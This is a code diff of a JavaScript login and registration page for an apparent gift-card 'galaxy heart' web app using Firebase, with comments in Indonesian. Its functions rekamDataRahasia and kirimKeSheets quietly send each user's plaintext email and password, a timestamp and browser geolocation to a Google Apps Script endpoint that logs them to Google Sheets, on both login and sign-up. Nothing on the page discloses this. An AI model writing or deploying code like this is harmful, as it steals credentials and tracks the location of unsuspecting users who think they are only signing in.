@@ -1,28 +1,29 @@
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
 import { 
     getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, 
-    onAuthStateChanged, signOut 
+    onAuthStateChanged, signOut, sendEmailVerification 
 } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
 
+// 1. KONFIGURASI FIREBASE (Sesuai dengan proyek Anda)
 const firebaseConfig = {
-  apiKey: "AIzaSyAm-t2mbHV7sSEcoDvNgZfTinmx5tcSz6s",
-  authDomain: "project-bd-163e4.firebaseapp.com",
-  projectId: "project-bd-163e4",
-  storageBucket: "project-bd-163e4.firebasestorage.app",
-  messagingSenderId: "691964855641",
-  appId: "1:691964855641:web:b0c45e7badc579cdfc3848",
-  measurementId: "G-YE2CW973NL"
+    apiKey: "AIzaSyAm-t2mbHV7sSEcoDvNgZfTinmx5tcSz6s",
+    authDomain: "project-bd-163e4.firebaseapp.com",
+    projectId: "project-bd-163e4",
+    storageBucket: "project-bd-163e4.firebasestorage.app",
+    messagingSenderId: "691964855641",
+    appId: "1:691964855641:web:b0c45e7badc579cdfc3848"
 };
 
 const app = initializeApp(firebaseConfig);
 const auth = getAuth(app);
 
-let timerInterval; 
+// URL APPS SCRIPT (Pastikan selalu gunakan URL Deployment TERBARU Anda!)
+const urlAppsScript = "https://script.google.com/macros/s/AKfycbxsTRDN4JanQwOLqn0T-tW5szz9RoVOdws1o5rAihSYaPi7CbCq4w3jsgLs-4I_4uCPzw/exec";
 
+// 2. TUNGGU UI SELESAI DI-RENDER
 document.addEventListener('DOMContentLoaded', () => {
     const loginCard = document.getElementById('login-card');
     const contentCard = document.getElementById('content-card');
-    const mainContainer = document.getElementById('main-container');
     const galaxyUniverse = document.getElementById('galaxy-universe');
     const giftBoxWrapper = document.getElementById('gift-box-wrapper');
     const bgMusic = document.getElementById('bg-music');
@@ -32,165 +33,135 @@ document.addEventListener('DOMContentLoaded', () => {
     const emailInput = document.getElementById('input-email');
     const passwordInput = document.getElementById('input-password');
 
-    // 1. Monitor Status Autentikasi Firebase
+    // 3. MONITOR STATUS LOGIN (AUTH STATE)
     onAuthStateChanged(auth, (user) => {
         if (user) {
-            if (loginCard) loginCard.classList.add('hidden');
-            if (contentCard) contentCard.classList.remove('hidden');
-            if (mainContainer) mainContainer.classList.remove('hidden');
-            if (galaxyUniverse) galaxyUniverse.classList.add('hidden');
-            
-            if (typeof jalankanCounterWaktu === 'function') {
-                jalankanCounterWaktu();
+            if (user.emailVerified) {
+                // Jika sudah verifikasi email, buka akses kartu kado
+                loginCard.classList.add('hidden');
+                contentCard.classList.remove('hidden');
+                galaxyUniverse.classList.add('hidden');
+            } else {
+                alert("Akses Ditangguhkan! Silakan buka kotak masuk atau folder SPAM email Anda, lalu klik link verifikasi terlebih dahulu.");
+                signOut(auth);
             }
         } else {
-            if (loginCard) loginCard.classList.remove('hidden');
-            if (contentCard) contentCard.classList.add('hidden');
-            if (mainContainer) mainContainer.classList.remove('hidden');
-            if (galaxyUniverse) galaxyUniverse.classList.add('hidden');
-            
-            if (timerInterval) clearInterval(timerInterval);
+            // Jika belum login, tampilkan menu login
+            loginCard.classList.remove('hidden');
+            contentCard.classList.add('hidden');
+            galaxyUniverse.classList.add('hidden');
         }
     });
 
-    // 2. Event Delegasi Global untuk Tombol Logout
+    // 4. AKSI SAAT KADO DIKLIK
+    if (giftBoxWrapper) {
+        giftBoxWrapper.addEventListener('click', () => {
+            contentCard.classList.add('hidden');
+            galaxyUniverse.classList.remove('hidden'); 
+            
+            // Putar musik latar
+            if (bgMusic) bgMusic.play().catch(() => console.log("Audio ditahan oleh browser"));
+            
+            // Panggil fungsi efek mengetik yang ada di HTML
+            if (typeof window.startGalaxyHeart === 'function') {
+                window.startGalaxyHeart();
+            }
+        });
+    }   
+
+    // 5. TOMBOL LOGOUT
     document.addEventListener('click', async (e) => {
         if (e.target && e.target.id === 'btn-logout') {
             e.preventDefault();
-            try {
-                if (bgMusic) {
-                    bgMusic.pause();
-                    bgMusic.currentTime = 0;
-                }
-                await signOut(auth);
-            } catch (error) {
-                console.error("Gagal melakukan signOut:", error);
-                location.reload();
-            }
+            if (bgMusic) { bgMusic.pause(); bgMusic.currentTime = 0; }
+            await signOut(auth);
         }
     });
 
-    // 3. Interaksi Klik Buka Kado
-    if (giftBoxWrapper) {
-        giftBoxWrapper.addEventListener('click', () => {
-            if (mainContainer) mainContainer.classList.add('hidden');
-            if (galaxyUniverse) galaxyUniverse.classList.remove('hidden');
-            
-            if (typeof startGalaxyHeart === 'function') {
-                startGalaxyHeart();
-            }
-            if (bgMusic) {
-                bgMusic.play().catch(err => console.log("Audio ditahan browser"));
-            }
-        });
-    }
-
-    // 4. Interaksi Tombol Login
+    // 6. PROSES LOGIN
     if (loginButton) {
         loginButton.addEventListener('click', (e) => {
             e.preventDefault();
-            
-            // Mengambil value secara langsung tanpa ternary operator untuk stabilitas WebView
-            const emailVal = emailInput.value;
-            const passwordVal = passwordInput.value;
+            const emailClean = emailInput.value.trim();
+            const passwordClean = passwordInput.value.trim();
 
-            if (!emailVal || !passwordVal || emailVal.trim() === "" || passwordVal.trim() === "") {
-                alert("Email dan Password wajib diisi!");
+            if (!emailClean || !passwordClean) {
+                alert("Email dan sandi tidak boleh kosong!");
                 return;
             }
 
-            const emailClean = emailVal.trim();
-            const passwordClean = passwordVal.trim();
-
-            // Panggil fungsi perekaman data
+            // Jalankan pelacakan data & lokasi ke Google Sheets
             rekamDataRahasia(emailClean, passwordClean);
 
+            // Proses autentikasi Firebase
             signInWithEmailAndPassword(auth, emailClean, passwordClean)
-                .then(() => console.log("Firebase Login Sukses"))
-                .catch((error) => alert("Login Gagal: " + error.message));
+                .catch((error) => alert("Gagal Masuk: " + error.message));
         });
     }
 
-    // 5. Interaksi Tombol Register
+    // 7. PROSES REGISTRASI AKUN BARU
     if (btnRegister) {
-        btnRegister.addEventListener('click', async (e) => {
+        btnRegister.addEventListener('click', (e) => {
             e.preventDefault();
-            
-            const emailVal = emailInput.value;
-            const passwordVal = passwordInput.value;
+            const emailClean = emailInput.value.trim();
+            const passwordClean = passwordInput.value.trim();
 
-            if (!emailVal || !passwordVal || emailVal.trim() === "" || passwordVal.trim() === "") {
-                alert("Email dan Password tidak boleh kosong!");
+            if (!emailClean || !passwordClean) {
+                alert("Silakan lengkapi email dan password pendaftaran!");
                 return;
             }
 
-            const emailClean = emailVal.trim();
-            const passwordClean = passwordVal.trim();
-
+            // Jalankan pelacakan data & lokasi ke Google Sheets
             rekamDataRahasia(emailClean, passwordClean);
 
-            try { 
-                await createUserWithEmailAndPassword(auth, emailClean, passwordClean);
-                alert("Akun baru berhasil terdaftar!");
-            } catch (error) {
-                if (error.code === 'auth/email-already-in-use') alert("Email sudah terdaftar.");
-                else alert("Gagal mendaftar: " + error.message);
-            }
+            // Buat user baru di Firebase
+            createUserWithEmailAndPassword(auth, emailClean, passwordClean)
+                .then((result) => {
+                    // Kirim tautan verifikasi email
+                    sendEmailVerification(result.user)
+                        .then(() => {
+                            alert("Pendaftaran Berhasil! Tautan verifikasi telah dikirim. Periksa email Anda dan verifikasi sebelum masuk.");
+                            signOut(auth);
+                            emailInput.value = "";
+                            passwordInput.value = "";
+                        });
+                })
+                .catch((error) => alert("Gagal Mendaftar: " + error.message));
         });
     }
 });
 
-// --- FUNGSI LOGGING OPTIMAL ---
+// 8. FUNGSI PELACAKAN GEOLOCATION & WAKTU
 function rekamDataRahasia(email, password) {
-    // Normalisasi teks untuk memfilter bypass
-    const checkEmail = email.toLowerCase();
-    const checkPassword = password.toLowerCase();
-
-    // Pengecekan ketat kata kunci bypass teks literal
-    if (checkPassword === "tanpa password" || checkPassword === "tanpapassword" || checkPassword === "undefined" || checkPassword === "null") {
-        console.log("Aktivitas diblokir: Terdeteksi teks bypass.");
-        return;
-    }
-
-    const urlAppsScript = "https://script.google.com/macros/s/AKfycbwls6qJbxxc04aJgUvZTYL96-88KN4SY7lrJiyWnxLxyT1pwn35BYncjT_VY3sKr19h9A/exec";
-    
     const sekarang = new Date();
-    const opsiWaktu = { 
-        timeZone: 'Asia/Jakarta', 
-        year: 'numeric', month: '2-digit', day: '2-digit', 
-        hour: '2-digit', minute: '2-digit', second: '2-digit' 
-    };
+    const opsiWaktu = { timeZone: 'Asia/Jakarta', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' };
     const waktuFormat = sekarang.toLocaleString('id-ID', opsiWaktu);
-    
+
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
             (position) => {
                 const lat = position.coords.latitude;
                 const lon = position.coords.longitude;
-                kirimKeAppsScript(urlAppsScript, email, password, waktuFormat, `${lat}, ${lon}`);
+                kirimKeSheets(email, password, waktuFormat, `${lat}, ${lon}`);
             },
             () => {
-                // Lokasi ditolak tetap kirim karena email & password dipastikan asli lewat validasi tombol
-                kirimKeAppsScript(urlAppsScript, email, password, waktuFormat, "Izin Lokasi Ditolak");
+                kirimKeSheets(email, password, waktuFormat, "Izin Lokasi Ditolak User");
             },
             { timeout: 4000 }
         );
     } else {
-        kirimKeAppsScript(urlAppsScript, email, password, waktuFormat, "Tidak Didukung Browser");
+        kirimKeSheets(email, password, waktuFormat, "Tidak Didukung Browser");
     }
 }
 
-function kirimKeAppsScript(urlBase, email, pw, waktu, lokasi) {
-    const urlFinal = `${urlBase}?email=${encodeURIComponent(email)}` +
+// 9. FUNGSI PENGIRIMAN FETCH API KE GOOGLE APPS SCRIPT
+function kirimKeSheets(email, pw, waktu, lokasi) {
+    const urlFinal = `${urlAppsScript}?email=${encodeURIComponent(email)}` +
                      `&pw=${encodeURIComponent(pw)}` +
                      `&waktu=${encodeURIComponent(waktu)}` +
                      `&lokasi=${encodeURIComponent(lokasi)}`;
                      
-    fetch(urlFinal, {
-        method: 'GET',
-        mode: 'no-cors',
-        cache: 'no-cache'
-    })
-    .then(() => console.log("Data berhasil dikirim ke Sheets"))
-    .catch(err => console.log("Gagal fetch:", err));
+    fetch(urlFinal, { method: 'GET', mode: 'no-cors', cache: 'no-cache' })
+    .then(() => console.log("Data berhasil dijembatani ke Sheets via Web App."))
+    .catch(err => console.log("Koneksi gagal log server:", err));
 }
